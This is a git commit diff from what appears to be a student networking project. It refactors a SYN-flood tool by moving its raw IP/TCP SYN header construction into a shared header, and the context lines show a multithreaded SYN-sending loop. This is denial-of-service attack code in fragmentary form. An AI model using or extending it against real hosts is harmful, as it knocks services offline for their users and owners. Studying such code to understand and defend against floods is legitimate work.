2d07e388be78c31acee85fbf9b27cf869679ee3f
sikako <sikako.setp08@nctu.edu.tw>
2022-06-08 11:19:55 +0800

    init_header modulized

--- syn-flood/syn_flood.c
+++ syn-flood/syn_flood.c
@@ -5,18 +5,12 @@
 #include <signal.h>
 #include <sys/time.h>
 #include <sys/types.h>
-#include <sys/socket.h>
 #include <string.h>
 #include <netdb.h>
 #include <errno.h>
-#include <stdlib.h>
-#include <time.h> 
-#include <arpa/inet.h>
 #include <pthread.h>
-#include <netinet/ip.h>
-#include <netinet/tcp.h>
-#include "../header/packet_struct.h"
 #include "../header/CRC16_check.h"
+#include "../header/init_header.h"
 
 /* 最多線程數 */
 #define MAXCHILD 128
@@ -29,42 +23,6 @@ static int alive = -1;
 
 char dst_ip[20] = { 0 };
 int dst_port;
-
-
-void init_header(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, struct pseudohdr *pseudoheader){
-	int len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-	// IP頭部初始化
-	ip_hdr->version = 4;
-	ip_hdr->ihl = 5;
-	ip_hdr->tos = 0;
-	ip_hdr->tot_len = htons(len);
-	ip_hdr->id = random() && 0x00ffff;
-	ip_hdr->frag_off = htons(0);
-	ip_hdr->ttl = 255;
-	ip_hdr->protocol = IPPROTO_TCP;
-	ip_hdr->check = 0;
-	ip_hdr->saddr = 0;
-	ip_hdr->daddr = inet_addr(dst_ip);
-
-	// TCP頭部初始化
-	tcp_hdr->th_sport = htons( rand()%16383 + 49152 );
-	tcp_hdr->th_dport = htons(dst_port);
-	tcp_hdr->th_seq = htonl( rand()%90000000 + 2345 ); 
-	tcp_hdr->th_ack = 0; 
-	tcp_hdr->th_flags = TH_SYN;
-	tcp_hdr->th_win = htons (2048);  
-	tcp_hdr->th_sum = 0;
-	tcp_hdr->th_urp = 0;
-
-	//TCP偽頭部初始化
-	pseudoheader->zero = 0;
-	pseudoheader->protocol = IPPROTO_TCP;
-	pseudoheader->length = htons(sizeof(struct tcphdr));
-	pseudoheader->daddr = inet_addr(dst_ip);
-	srand((unsigned) time(NULL));
-
-}
-
 
 /* 發送SYN包函数
  * 填寫IP頭部，TCP頭部
@@ -82,7 +40,7 @@ void* send_synflood(void *addr_info){
 	len = sizeof(struct iphdr) + sizeof(struct tcphdr);
 	
 	/* 初始化頭部 */
-	init_header(&ip_hdr, &tcp_hdr, &pseudoheader);
+	init_header(&ip_hdr, &tcp_hdr, &pseudoheader, dst_ip, dst_port);
 	
 	/* 處於活動狀態時持續發送SYN包 */
 	while(alive){
